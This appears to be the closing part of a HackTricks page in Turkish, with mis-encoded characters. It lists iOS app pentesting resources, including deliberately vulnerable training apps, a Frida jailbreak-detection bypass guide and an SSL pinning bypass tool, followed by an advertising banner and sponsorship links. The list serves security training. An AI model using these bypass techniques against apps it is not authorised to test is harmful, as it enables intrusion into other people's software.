* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS Ã¼cretsiz kurs([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C versiyonu [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift versiyonu
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ±yla desteklenen **otomatik iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olacak ÅŸekilde AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerine gÃ¶z atÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
